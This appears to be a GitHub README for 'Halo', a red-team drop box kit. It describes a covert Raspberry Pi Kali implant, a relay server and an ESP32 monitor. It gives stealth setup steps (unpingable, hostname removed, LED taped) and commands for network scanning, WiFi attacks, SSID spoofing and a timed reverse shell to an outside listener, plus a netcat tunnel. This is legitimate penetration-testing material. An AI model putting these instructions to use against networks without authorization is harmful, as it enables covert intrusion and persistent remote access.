# "Halo" Drop Box Kit
---
The Halo three-piece kit is a complete package for covert implant and reception. The implant device is a non-pingable Kali box that connects to the target network via Ethernet with multiple arming modes. It is also controllable by a WiFi access point and typically used to establish a reverse-shell to a HaloRx listener server. The attacker connects to the HaloRx via Ethernet, which protects the attacker's network in case the Halo drop box system is compromised. To complete the kit, a specially programmed TTGO ESP32 board monitors for the Halo AP to verify the implant and provide a quick view of the WiFi landscape. All three components work together and may be deployed and verified without any other devices.

### Component 1: Halo
The implant is a full functioning Kali box with multiple attacks options, WiFi attacks, and Bluetooth monitoring. Standard attacks include outbound tests, mapping of network, attacks on WiFi routers, and distraction chaff. 

### Component 2: HaloRx
The Halo drop box may be used to establish a connection directly to an attacker's laptop, but the nature of reverse shells allows the possibility of a target "hacking back". To establish a firewall, a disposable system is used to receive the shell from the drop box but remain separate from the attacker's system. An easy tunneling script allows attacks from an attacker system to flow through the HaloRx box.

### Component 3: Halo MiniRecon Device
A miniature device used to verify that the Halo drop box is running correctly without having to use other devices. In addition the device provides an at-a-glance view of the WiFi landscape. 

![Example setup](https://github.com/saintcrossbow/Halo-Drop-Box-Kit/blob/master/Docs/KitPicture.jpg "Example Setup")

## Part List
Your setup may vary, but a minimum will look something like this:
* Raspberry Pi x 2
* Covert Case (I used the Hak5 Ominous Box)
* External adapter (I used the RT5370)
* 16 GB SD
* 8 GB SD 
* Ethernet cables x 2
* USB micro cables x 2
* USB 3.0 cable 
* External battery (optional)

## Creation
_On the Halo drop box Raspberry Pi:_
1. Install the latest RPi version for Kali (or whatever OS you decide). A good example is [via null-byte](https://null-byte.wonderhowto.com/how-to/set-up-headless-raspberry-pi-hacking-platform-running-kali-linux-0176182/)
2. Connect to a monitor and enable SSH; disconnect and reboot.
3. Change password for root
4. Connect WiFi adapter
5. Install the following additional tools (needed for wiping test data, running bluetooth, reverse shell usage, and possible password cracking):
* wipe
* hciconfig
* hcitool
* sdptool
* btscanner
* blueranger
* bluelog
* bluesnarfer
* macchanger 
* wordlists
* autossh
6. Establish an access point through wlan0 in whatever preference you have; see [example](https://www.raspberrypi.org/documentation/configuration/wireless/access-point-routed.md)
7. From this repository in the Halo Attack folder, copy the files from these directories to the corresponding directory:
- /etc/*
- /payloads/*
- /usr/local/bin/*
Make sure to make all files executable by using `chmod +x *`
8. To make the payload manager start on boot:
`crontab -e`
`@reboot /payloads/payld-mgr`
9. Run the following commands to make unpingable:
`echo "net.ipv4.icmp_echo_ignore_all = 1" >> /etc/sysctl.conf`
`sysctl -p`
10. Remove details from `/etc/hostname`
11. Probably a good idea to tape over the LED

_On the HaloRx Raspberry Pi:_
1. Install whatever Linux flavor you like. I used a Raspbian install from 2 years ago. Just make sure SSH is enabled. Also don't leave any private information on this host - this is your disposable server that your attack network is going through.
2. From this repository in the Halo Attack folder, copy the files from these directories to the corresponding directory:
- /etc/*
- /payloads/*
- /usr/local/bin/*
3. Make sure to make executable by using `chmod +x *`

_On the ESP32:_
1. Download the absolute latest Arduino IDE. Make sure you do not accidentally use a wrong previously installed version. Please note that though I like what Arduino does for us, I absolutely do not enjoy Arduino coding. It just seems to tedious and too easy to screw up. So this is a rather easy project with no soldering and not a lot creativity
2. Get the [default color sketch working](https://github.com/Xinyuan-LilyGO/TTGO-T-Display/blob/master/TTGO-T-Display.ino)
3. If it works - awesome - we're going to modify that script directly to do what we want. Replace the entirety of the INO file with the contents of `\Halo Mini Recon\TTGO-T-Display.ino` file.
4. Take deep breath, compile, and hope that it all works. If it doesn't - wow - I don't know why either!

### Devices should now be in working state.

## Halo Attack Device Usage
---
_Commands_
If you can't remember the commands, the device gives a cheat sheet on boot.
* `arm`: Show currently armed payloads, and specify what payloads to start on boot.
* `disarm`: Toggle off payloads
* `startvnc / stopvnc`: Enable desktop - use sparingly and always turn off when not in use.
* `sigint n`: A catch-all capture of Bluetooth and WiFi beacons for n seconds
* `outbound_test`: A basic check to determine if the device can get out to the Internet.
* `std_nmap t`: run a standard discovery and version check, normally in polite mode but can specify timing by t
* `reverse shell ip port`: Randomly call back every 10 - 70 seconds 
* `ap_timed_mine`: Run fuse for n seconds and then run bessides-ng WiFi attack for q seconds
* `chaff`: Start SSID spoofing to cause a distraction.

_Connection_
* Connect attack box to target's Ethernet
* Power the box with USB power from the target's server, or from an outlet, or even a USB battery (not ideal and may shut off unexpectedly). If stealth is necessary, be aware that devices powered on the wall are highly suspicious.
* Switch on the mini recon device to verify the AP is working (and take a look at the WiFi landscape if you like)
* Optionally arm payloads
	
_Disconnect_
* Always shut down the device to avoid corruption; e.g. `shutdown -h now``

_Setting up Kit for Reverse Shell_
1. Connect via WiFi to Halo Attack
2. If there is already a reverse shell process:
  *Run `ps aux | grep reverse` to find the reverse shell process, then kill the pid
  *Use `disarm` command to stop reverse shell
3. Create a SSH private and public key using ssh-keygen - don't enter a password, we'll just being using the keys
4. From HaloRx: 
  *Connect to Internet and get IP (e.g. https://ip.me/). Depending on your network setup you may need to set up a forwarding rule.
  *Go to home directory, create `.ssh` directory if needed
  *Copy public key into `./ssh/halokey`
5. From Halo attack box: 
  *ssh to the HaloRx IP to verify connection
  *Manually run `reverseshell ip port` to verify connection - note the port can be whatever you want
6. From HaloRx: 
  *Run halo_receive and wait for shell. Should take no more than 90 seconds. 
  *Remember to enter the password for the Halo attack box, not the receiver
  *Once successful, close the shell
7. From Halo attack box: 
  *Change to payloads directory and change `rhost` and `rport` to match the Halo listener
  *Run `arm reverse-shell`
  *Run `arm` to verify command

_Tunneling through HaloRx_

You can send your commands from your attack network through HaloRx to go directly to the Halo attack box using the `tunnel_nc` command. Using a basic netcat technique, the script redirect all traffic from one port sends direct to the Halo attack box. Usage:

`tunnel_nc listenerPort targetIP targetPort`

_FAQ_
- _Why Halo?_ 
Inpsiration was from high-altitude low-opening parachute technique for infiltrators. Also a nice touch to the Saint technique, don't you think?

- _I do not see an AP when booting Halo._ 
If it was there before, did you unplug without doing a shutdown? If so, eject the SD and connect to a working Linux system. Run fsck on both of the partitions on the SD. You may also be able to get the box temporarily working by connecting a USB keyboard and pressing Ctrl-D to bypass the error message it is likely stuck on.

- _An ominous box? Really? Seems kinda huge and weird._
Well yes, I fortunately bought this cheaply. It does fit everything though along with a battery, and I've really wanted to find a way to put it to use.

- _This whole MiniRecon device seems a little out-of-place - did you just happen to have the ESP32 board lying around?_
Yes

- _Why the halokey nonsense for the SSH script on HaloRx?_
Mostly laziness. The Halo attack system originally was going to dial back directly to the attacker, and this was a mitigation to limit hack back (it would remove the key when complete).

